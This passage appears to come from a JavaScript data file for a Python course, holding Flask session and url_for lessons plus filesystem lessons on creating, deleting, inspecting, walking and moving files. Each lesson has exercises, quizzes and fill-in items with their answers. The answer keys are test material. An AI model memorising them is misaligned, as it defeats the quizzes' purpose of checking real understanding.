      a: "Note that `/whoami` knows who you are on a completely fresh request — that is the cookie coming back:",
      code: ['python', `@app.route("/login", methods=["POST"])
def login():
    session["user"] = request.form.get("user", "").strip()
    return redirect(url_for("whoami"))

@app.route("/whoami")
def whoami():
    return "you are " + session.get("user", "nobody")

@app.route("/logout", methods=["POST"])
def logout():
    session.pop("user", None)
    return redirect(url_for("home"))`] },
    { q: "Log in, then open devtools → Application → Cookies and find the `session` cookie. Decode the part before the first dot. What do you see?",
      hint: "It is base64.",
      a: "Your own JSON, readable in plain text — something like `{\"user\":\"itay\"}`. This is the point of the lesson: signed means tamper-proof, not private." },
    { q: "Change one character in the session cookie's value in devtools, then reload. What happens?",
      hint: "The signature no longer matches.",
      a: "Flask silently discards the whole session and treats you as a new visitor — `session.get(\"user\")` returns `None`. It does not error, because a bad cookie is indistinguishable from someone else's junk. That silent discard *is* the protection working." },
    { q: "Given the above, explain why `session[\"is_admin\"] = True` is safe to store but a password is not.",
      a: "Both are equally *unforgeable* — a visitor cannot flip `is_admin` to True without your key. But both are equally *readable*. `is_admin` being visible is harmless; a password being visible is a disaster, and it would also be sent over the network on every request. Store an id and look up privileges server-side." },
    { q: "Restart the Flask server with a different `secret_key` while logged in, then reload. What happens and why?",
      a: "You are logged out. The old cookie's signature was produced with the old key, so it no longer verifies and the session is discarded. This is also the emergency response to a leaked key — rotating it invalidates every session everywhere at once." }
  ],
  quiz: [
    { q: "Flask's session cookie is signed. What does that guarantee?",
      opts: ["Nobody can read the contents", "The contents cannot be changed without the key", "It expires automatically", "It is stored on the server"], correct: 1,
      why: "Signed means tamper-proof, not private. The contents are base64 and readable by anyone holding the cookie." },
    { q: "Which of these is genuinely unsafe to put in a Flask session?",
      opts: ["A user id", "A display name", "A password", "A theme preference"], correct: 2,
      why: "Everything in the cookie is readable. A password there is exposed to anyone who sees the cookie, and re-sent on every request." },
    { q: "Someone edits a character of their session cookie. What does Flask do?",
      opts: ["Raises a 500", "Silently discards the session", "Logs them in as admin", "Repairs the signature"], correct: 1,
      why: "The signature fails to verify, so the session is treated as absent. No error — a corrupt cookie is indistinguishable from junk." },
    { q: "What happens to logged-in users if you change `secret_key`?",
      opts: ["Nothing", "They are all logged out", "Their data is deleted", "Flask refuses to start"], correct: 1,
      why: "Existing signatures no longer verify. That is also the fix if a key ever leaks." }
  ],
  fill: [
    { prompt: "Remember who this visitor is.", lang: 'python',
      code: '___["user"] = "itay"', opts: ["request", "session", "cookies", "g"], correct: 1,
      why: "session behaves like a dict and is stored in a signed cookie." },
    { prompt: "Log them out without a KeyError if they were never in.", lang: 'python',
      code: 'session.___("user", None)', opts: ["del", "remove", "pop", "clear"], correct: 2,
      why: "`pop` with a default removes the key if present and does nothing otherwise." },
    { prompt: "Stop JavaScript from reading the session cookie.", lang: 'python',
      code: 'app.config["SESSION_COOKIE____"] = True', opts: ["SECURE", "HTTPONLY", "SAMESITE", "PRIVATE"], correct: 1,
      why: "HttpOnly blocks document.cookie access, limiting the damage of an XSS bug." }
  ]
},

/* ── os 06 ──────────────────────────────────────────────── */
"os:5": {
  blocks: [
    ['p', "You already use `os.makedirs(LOG_DIR, exist_ok=True)` and know why the flag is there. This lesson covers the rest of the verbs that change the shape of the filesystem — and the habits that stop a cleanup script deleting the wrong thing."],
    ['h', "Creating"],
    ['code', 'python', `os.mkdir("logs")                        # one level; parent must exist
os.makedirs("a/b/c")                    # every missing level
os.makedirs("a/b/c", exist_ok=True)     # and don't complain if it's there`],
    ['tbl',
      ["Call", "Missing parent", "Already exists"],
      [
        ["`os.mkdir`", "`FileNotFoundError`", "`FileExistsError`"],
        ["`os.makedirs`", "creates it", "`FileExistsError`"],
        ["`os.makedirs(exist_ok=True)`", "creates it", "does nothing"]
      ]
    ],
    ['note', "`exist_ok=True` is what makes an operation **idempotent** — safe to run any number of times. That property is why your `/about` route can call it on every single request."],
    ['h', "Deleting"],
    ['code', 'python', `os.remove(path)          # a file. FileNotFoundError if absent
os.rmdir(path)           # an EMPTY directory only
shutil.rmtree(path)      # a directory and everything inside it`],
    ['warn', "`shutil.rmtree` is the most dangerous line in this whole track. It is recursive, permanent, and there is no recycle bin. One wrong variable and a folder is gone. Print the path before you pass it, at least while developing."],
    ['h', "Deleting without a race"],
    ['p', "The obvious guard has a hole in it:"],
    ['code', 'python', `# Looks careful, isn't:
if os.path.exists(path):
    os.remove(path)          # something may delete it in between`],
    ['p', "The gap between checking and acting is a **race condition**. Ask forgiveness instead — this is idiomatic Python, and it is atomic:"],
    ['code', 'python', `try:
    os.remove(path)
except FileNotFoundError:
    pass                     # already gone; that was the goal

# or, with pathlib:
Path(path).unlink(missing_ok=True)`],
    ['h', "A safe destructive script"],
    ['p', "Three habits, all cheap:"],
    ['code', 'python', `import os

def clean(folder, dry_run=True):
    for name in os.listdir(folder):
        path = os.path.join(folder, name)
        if not name.endswith(".tmp"):
            continue
        if dry_run:
            print("would delete", path)          # 1. dry run first
            continue
        print("deleting", path)                  # 2. log every action
        try:
            os.remove(path)
        except OSError as exc:                   # 3. keep going on failure
            print("could not delete", path, exc)`],
    ['ul', [
      "**Default to dry run.** Make the caller opt in to destruction, not out of it.",
      "**Log what you did**, not just what you intended.",
      "**Never build a delete path by string concatenation** — one stray value and you are deleting from the wrong root."
    ]]
  ],
  ex: [
    { q: "Run `os.mkdir(\"a/b/c\")` in an empty folder. Which exception, and which function fixes it?",
      a: "`FileNotFoundError`, because `mkdir` creates exactly one level and `a/b` does not exist. `os.makedirs(\"a/b/c\")` creates the whole chain." },
    { q: "Create `tmp/keep.txt`, then call `os.rmdir(\"tmp\")`. What happens, and what would remove it?",
      hint: "rmdir has one strict requirement.",
      a: "`OSError` — on Windows the message is “The directory is not empty”. `os.rmdir` only removes empty directories. `shutil.rmtree(\"tmp\")` removes it and its contents, which is exactly why it deserves care." },
    { q: "Write a `remove_quietly(path)` that deletes a file and does nothing if it is already gone — without using `os.path.exists`.",
      hint: "Catch the specific exception.",
      a: "Catching `FileNotFoundError` specifically means a `PermissionError` still surfaces, instead of being silently swallowed the way a bare `except OSError` would:",
      code: ['python', `def remove_quietly(path):
    try:
        os.remove(path)
    except FileNotFoundError:
        pass`] },
    { q: "Explain the bug in `if os.path.exists(p): os.remove(p)`.",
      a: "Between the check and the removal, another process — or another thread of yours — can delete the file, and `os.remove` then raises anyway. The check buys nothing and gives false confidence. This is a **TOCTOU** race (time of check, time of use), and the try/except version has no gap to exploit." },
    { q: "Write `clean(folder, dry_run=True)` that removes `.tmp` files, defaults to printing what it *would* do, and keeps going if one file cannot be deleted.",
      hint: "`os.path.join` for the path, and catch per file.",
      a: "The default matters: someone running `clean(\"C:/\")` by accident gets a list, not a disaster.",
      code: ['python', `def clean(folder, dry_run=True):
    for name in os.listdir(folder):
        if not name.endswith(".tmp"):
            continue
        path = os.path.join(folder, name)
        if dry_run:
            print("would delete", path)
            continue
        try:
            os.remove(path)
            print("deleted", path)
        except OSError as exc:
            print("could not delete", path, exc)`] }
  ],
  quiz: [
    { q: "`os.mkdir(\"a/b/c\")` where `a/b` does not exist. Result?",
      opts: ["Creates the whole chain", "FileNotFoundError", "FileExistsError", "Silently does nothing"], correct: 1,
      why: "mkdir creates one level. makedirs creates every missing parent." },
    { q: "What does `os.rmdir` refuse to do?",
      opts: ["Remove a file", "Remove a non-empty directory", "Remove a hidden folder", "Both of the first two"], correct: 3,
      why: "It removes empty directories only — not files, not populated folders. shutil.rmtree handles the recursive case." },
    { q: "Why prefer try/except over `if os.path.exists(p): os.remove(p)`?",
      opts: ["It is faster", "The check-then-act gap is a race condition", "exists() is deprecated", "It uses less memory"], correct: 1,
      why: "The file can vanish between the two lines, so remove() raises anyway. TOCTOU — the guard buys nothing." },
    { q: "What makes `os.makedirs(path, exist_ok=True)` safe to call on every request?",
      opts: ["It caches the result", "It is idempotent — running it twice changes nothing", "It is asynchronous", "It skips the filesystem"], correct: 1,
      why: "Idempotence is the property that makes repeated calls harmless, which is why your /about route can do it every time." }
  ],
  fill: [
    { prompt: "Create every missing level without failing if it exists.", lang: 'python',
      code: 'os.makedirs(LOG_DIR, ___=True)', opts: ["force", "parents", "exist_ok", "quiet"], correct: 2,
      why: "Without it, the second call raises FileExistsError." },
    { prompt: "Delete a folder and everything inside it.", lang: 'python',
      code: 'shutil.___(build_dir)', opts: ["rmdir", "remove", "rmtree", "delete"], correct: 2,
      why: "os.rmdir only removes empty folders. rmtree is recursive and permanent — handle with care." },
    { prompt: "Delete a file, ignoring the case where it is already gone.", lang: 'python',
      code: 'except ___:\n    pass', opts: ["OSError", "FileNotFoundError", "IOError", "Exception"], correct: 1,
      why: "Catch the specific one, so a PermissionError still surfaces instead of being swallowed." }
  ]
},

/* ── os 07 ──────────────────────────────────────────────── */
"os:6": {
  blocks: [
    ['p', "Asking the filesystem questions: does this exist, is it a file or a folder, how big is it, when did it change."],
    ['h', "The quick predicates"],
    ['code', 'python', `os.path.exists(p)     # anything at all
os.path.isfile(p)     # exists AND is a regular file
os.path.isdir(p)      # exists AND is a directory
os.path.islink(p)     # is a symlink`],
    ['note', "Each returns `False` rather than raising when the path is missing — including when a parent folder does not exist. That makes them safe to call on anything, but it also means `False` answers two different questions at once: “not there” and “there but wrong kind”."],
    ['h', "os.stat — one call, everything"],
    ['code', 'python', `info = os.stat("logs/app.log")

info.st_size      # bytes
info.st_mtime     # last modified, seconds since the epoch
info.st_atime     # last accessed
info.st_ctime     # metadata change (POSIX) / creation (Windows)
info.st_mode      # type and permission bits`],
    ['p', "`os.path.getsize(p)` and `os.path.getmtime(p)` are thin wrappers that call `stat` and pull one field. If you need two facts about the same file, call `os.stat` once instead — each of those helpers is a separate trip to disk."],
    ['h', "Timestamps are numbers"],
    ['code', 'python', `import datetime

ts = os.path.getmtime("logs/app.log")     # 1785312000.123
when = datetime.datetime.fromtimestamp(ts)
print(when.strftime("%Y-%m-%d %H:%M"))     # 2026-08-01 14:02`],
    ['warn', "`st_ctime` means different things per platform: creation time on Windows, inode-change time on Linux. If you need creation time portably, you generally cannot have it — use `st_mtime`, which means the same thing everywhere."],
    ['h', "Ask forgiveness, not permission"],
    ['p', "Python has a name for the two styles:"],
    ['ul', [
      "**LBYL** — Look Before You Leap: check first, then act.",
      "**EAFP** — Easier to Ask Forgiveness than Permission: just act, handle the failure."
    ]],
    ['code', 'python', `# LBYL — has a gap
if os.path.isfile(p):
    with open(p) as f:
        data = f.read()

# EAFP — no gap
try:
    with open(p) as f:
        data = f.read()
except FileNotFoundError:
    data = ""`],
    ['p', "Between the `isfile` and the `open`, the file can be deleted, renamed, or replaced. Python prefers EAFP for exactly this reason. Use the predicates for *reporting* — building a listing, choosing a branch — and try/except for *acting*."],
    ['h', "A size formatter"],
    ['code', 'python', `def human(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}" if unit == "B" else f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"`]
  ],
  ex: [
    { q: "Print the size and last-modified date of `logs/app.log` in a readable format.",
      hint: "`datetime.fromtimestamp`.",
      a: "One `os.stat` call gives both, instead of two separate trips through `getsize` and `getmtime`:",
      code: ['python', `import os, datetime

info = os.stat(LOG_FILE)
when = datetime.datetime.fromtimestamp(info.st_mtime)
print(info.st_size, "bytes, last written", when.strftime("%Y-%m-%d %H:%M"))`] },
    { q: "What do `os.path.isfile` and `os.path.isdir` return for a path whose parent folder does not exist?",
      a: "Both return `False`, no exception. Convenient, but it means `False` conflates “missing” with “wrong kind” — if you need to tell those apart, use `os.path.exists` alongside, or catch the error from the operation you actually wanted." },
    { q: "Rewrite `if os.path.isfile(p): open(p).read()` in EAFP style, and say what the LBYL version risks.",
      hint: "Catch `FileNotFoundError`.",
      a: "The LBYL version can still raise: the file may be deleted between the check and the open. It also silently does nothing when the file is missing, which hides the case rather than handling it.",
      code: ['python', `try:
    with open(p, encoding="utf-8") as f:
        data = f.read()
except FileNotFoundError:
    data = ""`] },
    { q: "List every file in your project over 1KB, largest first, with a human-readable size.",
      hint: "`sorted` with a `key` and `reverse=True`.",
      a: "Using `e.stat()` from `scandir` avoids a second disk trip per entry, as in lesson 05:",
      code: ['python', `import os

rows = []
with os.scandir(".") as entries:
    for e in entries:
        if e.is_file() and e.stat().st_size > 1024:
            rows.append((e.stat().st_size, e.name))

for size, name in sorted(rows, reverse=True):
    print(f"{size/1024:8.1f} KB  {name}")`] },
    { q: "Why is `st_mtime` more portable than `st_ctime`?",
      a: "`st_mtime` means “content last modified” on every platform. `st_ctime` means creation time on Windows but inode-metadata-change time on Linux — so the same code reports different things depending on where it runs. If you need creation time portably you largely cannot have it; design around modification time instead." }
  ],
  quiz: [
    { q: "`os.path.isfile(p)` where `p`'s parent folder does not exist returns…",
      opts: ["FileNotFoundError", "None", "False", "True"], correct: 2,
      why: "The predicates never raise — but False conflates 'missing' with 'wrong kind'." },
    { q: "What does EAFP stand for, and which does Python prefer?",
      opts: ["Check first; Python prefers it", "Easier to Ask Forgiveness than Permission; Python prefers it", "A file-permission flag", "An os.stat field"], correct: 1,
      why: "Act and handle the failure. It removes the check-then-act gap that LBYL leaves open." },
    { q: "Which stat field means the same thing on Windows and Linux?",
      opts: ["`st_ctime`", "`st_mtime`", "`st_birthtime`", "None of them"], correct: 1,
      why: "st_ctime is creation time on Windows but metadata-change time on POSIX. st_mtime is content modification everywhere." },
    { q: "You need both size and mtime for one file. What is most efficient?",
      opts: ["getsize then getmtime", "One os.stat call, read two fields", "os.listdir", "Open the file and measure it"], correct: 1,
      why: "getsize and getmtime each call stat internally — that's two disk trips for information one call already returned." }
  ],
  fill: [
    { prompt: "Get every fact about a file in one call.", lang: 'python',
      code: 'info = os.___(path)', opts: ["info", "stat", "meta", "describe"], correct: 1,
      why: "getsize and getmtime are thin wrappers over this." },
    { prompt: "Read the file's size from the result.", lang: 'python',
      code: 'size = info.___', opts: ["size", "st_size", "length", "bytes"], correct: 1,
      why: "stat fields all carry the st_ prefix, from the underlying C struct." },
    { prompt: "Turn a modification time into a date.", lang: 'python',
      code: 'when = datetime.datetime.___(info.st_mtime)', opts: ["parse", "fromtimestamp", "strptime", "utcnow"], correct: 1,
      why: "st_mtime is seconds since the epoch, a plain float." }
  ]
},

/* ── os 08 ──────────────────────────────────────────────── */
"os:7": {
  blocks: [
    ['p', "`os.listdir` and `glob` look at one folder. `os.walk` descends through all of them, and it powers most real file scripts."],
    ['h', "The shape of it"],
    ['code', 'python', `for dirpath, dirnames, filenames in os.walk("."):
    print(dirpath, len(dirnames), "dirs,", len(filenames), "files")`],
    ['p', "Each iteration hands you one folder as three values:"],
    ['tbl',
      ["Name", "Is", "Contains"],
      [
        ["`dirpath`", "`str`", "the folder currently being visited"],
        ["`dirnames`", "`list`", "**names** of its subfolders"],
        ["`filenames`", "`list`", "**names** of its files"]
      ]
    ],
    ['warn', "`dirnames` and `filenames` are bare names, exactly as with `listdir`. Always rebuild the full path with `os.path.join(dirpath, name)` before you use it — this is the same trap as lesson 05, and it bites harder here because the folder changes on every iteration."],
    ['h', "Counting a whole tree"],
    ['code', 'python', `import os

total = 0
count = 0
for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    for name in filenames:
        path = os.path.join(dirpath, name)
        total += os.path.getsize(path)
        count += 1

print(count, "files,", round(total / 1024, 1), "KB")`],
    ['h', "Pruning — the important trick"],
    ['p', "Walking a Python project means walking `__pycache__`, `.git` and `node_modules`. You can stop `walk` descending by **modifying `dirnames` in place**:"],
    ['code', 'python', `SKIP = {".git", "__pycache__", "node_modules", ".venv"}

for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    dirnames[:] = [d for d in dirnames if d not in SKIP]
    ...`],
    ['warn', "The slice assignment `dirnames[:] = ...` is essential. Writing `dirnames = [...]` rebinds a local name and `walk` never sees it — the folders get visited anyway. `walk` reads the *same list object* you were handed, so you have to mutate it."],
    ['h', "Top-down or bottom-up"],
    ['p', "By default `walk` yields a folder **before** its children, which is what makes pruning possible. Pass `topdown=False` and it yields children first — which is what you need when deleting, since a folder must be empty before it can go."],
    ['h', "The pathlib version"],
    ['code', 'python', `from pathlib import Path

for p in Path(BASE_DIR).rglob("*.py"):
    print(p, p.stat().st_size)`],
    ['p', "`rglob` is far shorter when you just want matching files and do not need to prune. Reach for `os.walk` when you need control over which branches are entered at all."],
    ['h', "Errors are silent by default"],
    ['code', 'python', `def complain(err):
    print("skipping", err.filename, "-", err)

for dirpath, dirnames, filenames in os.walk(BASE_DIR, onerror=complain):
    ...`],
    ['p', "Without `onerror`, a folder you lack permission to read is skipped without a word — your totals are quietly wrong."]
  ],
  ex: [
    { q: "Count every file under your project and report the total size in KB.",
      hint: "Join `dirpath` and the name before calling `getsize`.",
      a: "Run it once and note how much of the total is `__pycache__` and `.git` — which motivates the next exercise.",
      code: ['python', `import os

total = count = 0
for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    for name in filenames:
        total += os.path.getsize(os.path.join(dirpath, name))
        count += 1
print(count, "files,", round(total / 1024, 1), "KB")`] },
    { q: "Add pruning so `.git`, `__pycache__` and `node_modules` are skipped. Compare the counts.",
      hint: "Mutate `dirnames` in place.",
      a: "In your workspace this cuts the count dramatically — `node_modules` alone holds thousands of files.",
      code: ['python', `SKIP = {".git", "__pycache__", "node_modules", ".venv"}

for dirpath, dirnames, filenames in os.walk(BASE_DIR):
    dirnames[:] = [d for d in dirnames if d not in SKIP]`] },
    { q: "Change the pruning line to `dirnames = [d for d in dirnames if d not in SKIP]` — no slice. What happens, and why?",
      hint: "What does plain assignment do to a name?",
      a: "The skipped folders are walked anyway. Plain assignment points the local name `dirnames` at a **new** list; `walk` still holds the original and reads that. `dirnames[:] = ...` mutates the object `walk` is holding, which is the only version that works." },
    { q: "Find every `.py` file in the tree twice — once with `os.walk`, once with `Path.rglob`. When is each the better tool?",
      a: "`rglob` wins on brevity when you simply want matching files. `os.walk` wins when you need to prune branches, act per-directory, or control traversal order — `rglob` gives you no way to say “do not descend into this one”.",
      code: ['python', `from pathlib import Path
py = list(Path(BASE_DIR).rglob("*.py"))`] },
    { q: "You need to delete an entire tree using `os.walk` rather than `shutil.rmtree`. Which direction must you walk, and why?",
      hint: "A directory must be empty before it can be removed.",
      a: "Bottom-up, with `topdown=False`. Files and deepest folders go first, so each directory is already empty by the time you reach it. Top-down would hit `OSError: directory not empty` on the very first `rmdir`.",
      code: ['python', `for dirpath, dirnames, filenames in os.walk(target, topdown=False):
    for name in filenames:
        os.remove(os.path.join(dirpath, name))
    os.rmdir(dirpath)`] }
  ],
  quiz: [
    { q: "What are the three values `os.walk` yields per iteration?",
      opts: ["path, size, mtime", "dirpath, dirnames, filenames", "root, files, errors", "folder, parent, depth"], correct: 1,
      why: "One folder per iteration, with the names — not paths — of what is inside it." },
    { q: "Why must you write `dirnames[:] = [...]` rather than `dirnames = [...]`?",
      opts: ["Style only", "Plain assignment rebinds a local name; walk keeps the original list", "Slices are faster", "walk requires a tuple"], correct: 1,
      why: "walk reads the same list object it handed you, so pruning has to mutate it in place." },
    { q: "You are deleting a tree with os.walk. Which direction?",
      opts: ["Top-down, the default", "Bottom-up with topdown=False", "Either works", "Alphabetical"], correct: 1,
      why: "A directory must be empty before rmdir will take it, so children have to go first." },
    { q: "A folder cannot be read due to permissions. What does os.walk do by default?",
      opts: ["Raises PermissionError", "Skips it silently", "Retries three times", "Returns None"], correct: 1,
      why: "Silent skipping makes totals quietly wrong. Pass onerror= to be told about it." }
  ],
  fill: [
    { prompt: "Unpack what walk hands you.", lang: 'python',
      code: 'for dirpath, ___, filenames in os.walk(root):', opts: ["subdirs", "dirnames", "folders", "children"], correct: 1,
      why: "dirpath, dirnames, filenames — and the last two are bare names." },
    { prompt: "Prune folders so walk never enters them.", lang: 'python',
      code: 'dirnames___ = [d for d in dirnames if d not in SKIP]', opts: ["", "[:]", ".copy()", "[0]"], correct: 1,
      why: "The slice assignment mutates the list walk is holding; plain assignment does not." },
    { prompt: "Walk children before their parents, ready for deletion.", lang: 'python',
      code: 'os.walk(target, ___=False)', opts: ["recursive", "followlinks", "topdown", "sorted"], correct: 2,
      why: "topdown=False yields the deepest folders first, so each is empty when you reach it." }
  ]
},

/* ── os 09 ──────────────────────────────────────────────── */
"os:8": {
  blocks: [
    ['p', "Moving and copying look trivial until a file already exists at the destination, or the destination is on another drive. Both cases have a specific right answer."],
    ['h', "rename vs replace"],
    ['code', 'python', `os.rename(src, dst)      # dst exists -> FileExistsError on Windows
os.replace(src, dst)     # dst exists -> silently overwritten, everywhere`],
    ['warn', "`os.rename` behaves **differently by platform** when the destination exists: it overwrites silently on Linux and raises `FileExistsError` on Windows. `os.replace` overwrites consistently on both. If you intend to overwrite, say so with `replace`; the code then means the same thing everywhere."],
    ['h', "Rename is atomic — and that is useful"],
    ['p', "On the same filesystem, a rename either fully happens or does not happen at all. No reader ever sees a half-written file. That gives you the safe-write pattern:"],
    ['code', 'python', `import os

def write_atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
    os.replace(tmp, path)      # atomic swap`],
    ['p', "If the program is killed mid-write, the real file is untouched — only the `.tmp` is incomplete. Writing directly to `path` would leave it truncated and corrupt."],
    ['h', "Across drives, rename fails"],
    ['code', 'python', `os.rename("C:/data/a.txt", "D:/backup/a.txt")
# OSError: [WinError 17] The system cannot move the file
# to a different disk drive`],
    ['p', "A rename only updates a directory entry, which cannot span filesystems. `shutil.move` handles it — it tries rename first and falls back to copy-then-delete:"],
    ['code', 'python', `import shutil
shutil.move("C:/data/a.txt", "D:/backup/a.txt")`],
    ['h', "Copying"],
    ['tbl',
      ["Function", "Copies", "Keeps timestamps/permissions"],
      [
        ["`shutil.copyfile`", "contents only", "no"],
        ["`shutil.copy`", "contents + permission bits", "permissions only"],
        ["`shutil.copy2`", "contents + metadata", "**yes**"],
        ["`shutil.copytree`", "a whole directory", "yes"]
      ]
    ],
    ['note', "`copy2` is the one you usually want — it is what a file manager does. Use `copytree(src, dst, dirs_exist_ok=True)` to merge into an existing folder rather than failing."],
    ['h', "Windows locks open files"],
    ['warn', "On Windows you cannot rename, move or delete a file that another process has open — including your own program if you forgot to close it. `PermissionError: [WinError 32] The process cannot access the file because it is being used by another process` almost always means a missing `with` block. On Linux the same operation quietly succeeds, which is why this surprises people moving between the two."],
    ['h', "Moving safely"],
    ['code', 'python', `import os, shutil

def move_no_clobber(src, dst_dir):
    os.makedirs(dst_dir, exist_ok=True)
    name = os.path.basename(src)
    root, ext = os.path.splitext(name)
    target = os.path.join(dst_dir, name)

    n = 2
    while os.path.exists(target):
        target = os.path.join(dst_dir, f"{root}-{n}{ext}")
        n += 1

    shutil.move(src, target)
    return target`]
  ],
  ex: [
    { q: "Create `a.txt` and `b.txt`, then run `os.rename(\"a.txt\", \"b.txt\")` on Windows. What happens? What would `os.replace` do?",
      a: "`os.rename` raises `FileExistsError` on Windows — but the same line silently overwrites `b.txt` on Linux. `os.replace` overwrites on both, which is why it is the right call whenever overwriting is your intent." },
    { q: "Write `write_atomic(path, text)` that can never leave a half-written file behind.",
      hint: "Write to a temp name, then swap.",
      a: "The swap is atomic on the same filesystem, so a reader sees either the old file or the new one — never a partial one. This is how config files and caches are written safely.",
      code: ['python', `def write_atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(text)
    os.replace(tmp, path)`] },
    { q: "Why does `os.rename` fail across drives, and what should you use instead?",
      a: "A rename only rewrites a directory entry within one filesystem — no bytes move. Crossing drives means physically copying the data, which rename cannot do, so it raises `OSError`. `shutil.move` tries rename first and falls back to copy-then-delete, so it works either way." },
    { q: "Copy `hello.py` to `hello_backup.py` preserving its modification time. Verify with `os.path.getmtime`.",
      hint: "Only one of the copy functions keeps metadata.",
      a: "`copyfile` and `copy` both give the new file a fresh mtime; only `copy2` preserves the original.",
      code: ['python', `import shutil, os
shutil.copy2("hello.py", "hello_backup.py")
print(os.path.getmtime("hello.py") == os.path.getmtime("hello_backup.py"))`] },
    { q: "You get `PermissionError: [WinError 32] ... being used by another process` when moving a log file. What is the most likely cause in your own code?",
      hint: "Look at how the file was opened.",
      a: "A file handle left open — an `open()` without a `with` block, so the file is still held when you try to move it. Windows locks open files; Linux does not, which is why the same code can work there and fail here. The fix is `with open(...) as f:`, which closes it even if an exception occurs." }
  ],
  quiz: [
    { q: "`os.rename(src, dst)` where dst already exists. What happens?",
      opts: ["Always overwrites", "Always raises", "Overwrites on Linux, raises on Windows", "Renames to dst-2"], correct: 2,
      why: "Platform-dependent — which is why os.replace exists. It overwrites consistently everywhere." },
    { q: "Why is rename-into-place the basis of a safe write?",
      opts: ["It is faster than writing", "It is atomic — readers see the old file or the new one, never half", "It compresses", "It skips the disk cache"], correct: 1,
      why: "Write to a temp file, then swap. A crash mid-write leaves the real file untouched." },
    { q: "Moving a file from C: to D: with os.rename raises OSError. Why?",
      opts: ["Permissions", "A rename only updates a directory entry and cannot cross filesystems", "The path is too long", "D: is read-only"], correct: 1,
      why: "No bytes move in a rename. shutil.move falls back to copy-then-delete when it must." },
    { q: "Which copy function preserves the modification time?",
      opts: ["`copyfile`", "`copy`", "`copy2`", "All of them"], correct: 2,
      why: "copy2 copies metadata as well as contents — it is what a file manager does." }
  ],
  fill: [
    { prompt: "Overwrite the destination consistently on every platform.", lang: 'python',
      code: 'os.___(tmp, path)', opts: ["rename", "replace", "move", "swap"], correct: 1,
      why: "os.rename raises on Windows when the target exists; os.replace does not." },
    { prompt: "Move a file that may land on another drive.", lang: 'python',
      code: 'shutil.___(src, dst)', opts: ["copy", "move", "rename", "transfer"], correct: 1,
      why: "It tries rename first, then falls back to copy-then-delete across filesystems." },
    { prompt: "Copy a file and keep its timestamps.", lang: 'python',
      code: 'shutil.___(src, dst)', opts: ["copyfile", "copy", "copy2", "copytree"], correct: 2,
      why: "Only copy2 preserves metadata; the others give the copy a fresh mtime." }
  ]
}

};

/* Merge written content onto the planned entries. */
Object.entries(LESSON_CONTENT).forEach(([key, content]) => {
  const [track, idx] = key.split(':');
  const lesson = COURSE[track] && COURSE[track].lessons[+idx];
  if (!lesson) return;
  lesson.blocks = content.blocks;
  lesson.ex = content.ex;
  lesson.quiz = content.quiz;
  lesson.fill = content.fill;
  delete lesson.plan;
  delete lesson.covers;
});

/* ═══════════════════════════════════════════════════════════
   ENHANCEMENTS
   Each lesson gains a worked example built up step by step with
   its real output shown, and a list of the specific mistakes
   that produce the errors you will actually see.
   ═══════════════════════════════════════════════════════════ */
const ENHANCE = {

"flask:2": [
  ['h', "Worked example: renaming a route without breaking the site"],
  ['p', "Say `/about` should become `/about-us`. Here is the same change made twice — once badly, once well — so you can see what `url_for` is actually buying you."],
  ['p', "**The version that breaks.** Three templates link to the page by hand:"],
  ['code', 'jinja', `<a href="/about">about</a>          <!-\- home.html   -\->
<a href="/about">about</a>          <!-\- nav.html    -\->
<a href="/about">read more</a>      <!-\- footer.html -\->`],
  ['p', "You change one line in `hello.py`:"],
  ['code', 'python', `@app.route("/about-us")     # was "/about"
def about():
    return "They not really care about us"`],
  ['p', "Nothing errors. The server starts fine. Every one of those three links now 404s, and you will not find out until you click each one."],
  ['p', "**The version that survives.** The templates ask for the URL by endpoint name:"],
  ['code', 'jinja', `<a href="{{ url_for('about') }}">about</a>`],
  ['p', "Now the same one-line change updates all three automatically, because `url_for` reads the live URL map at render time:"],
  ['code', 'text', `before the change:   url_for('about')  ->  /about
after  the change:   url_for('about')  ->  /about-us`],
  ['note', "The function name is the contract, not the URL string. That is the whole idea: URLs are allowed to change, endpoint names are not."],
  ['h', "Seeing it for yourself"],
  ['p', "Add this route temporarily and load it before and after renaming `/about`:"],
  ['code', 'python', `@app.route("/debug-links")
def debug_links():
    return "<br>".join([
        "home     -> " + url_for("home"),
        "about    -> " + url_for("about"),
        "user     -> " + url_for("user_name", name="itay"),
        "search   -> " + url_for("search", q="flask"),
    ])`],
  ['code', 'text', `home     -> /
about    -> /about
user     -> /user/itay
search   -> /search?q=flask`],
  ['p', "Note the last line: `q` is not part of the `/search` rule, so `url_for` appended it as a query string instead of raising. Any keyword that does not match a variable in the rule is added that way."],
  ['h', "Common mistakes"],
  ['ul', [
    "**Passing the URL instead of the endpoint** — `url_for(\"/about\")` raises `BuildError`. It wants `\"about\"`, the function name.",
    "**Forgetting a required variable** — `url_for(\"user_name\")` raises `BuildError` because the rule has `<name>` in it. Supply it: `url_for(\"user_name\", name=\"itay\")`.",
    "**Expecting definition order to matter** — it does not. Werkzeug sorts by specificity, so moving decorators around changes nothing.",
    "**Adding a trailing slash by accident** — `/about/` and `/about` are different rules with different behaviour. Pick one and be consistent."
  ]]
],

"flask:6": [
  ['h', "Worked example: a hobbies list that reads properly"],
  ['p', "Start from what you have and improve it one step at a time. Here is the data:"],
  ['code', 'python', `@app.route("/")
def home():
    hobbies = ["gaming", "coding", "reading"]
    return render_template("home.html", name="Human", hobbies=hobbies)`],
  ['p', "**Step 1 — the version you have now.** Two constructs doing one job:"],
  ['code', 'jinja', `{% if hobbies %}
  <ul>{% for h in hobbies %}<li>{{ h }}</li>{% endfor %}</ul>
{% else %}
  <p>go to touch some grass</p>
{% endif %}`],
  ['p', "**Step 2 — fold the empty case into the loop.** `{% for %}{% else %}` runs its else branch when there is nothing to iterate:"],
  ['code', 'jinja', `<ul>
{% for h in hobbies %}
  <li>{{ h }}</li>
{% else %}
  <li>go to touch some grass</li>
{% endfor %}
</ul>`],
  ['p', "**Step 3 — number them.** `loop.index` counts from 1:"],
  ['code', 'jinja', `<li>{{ loop.index }}. {{ h }}</li>`],
  ['code', 'text', `1. gaming
2. coding
3. reading`],
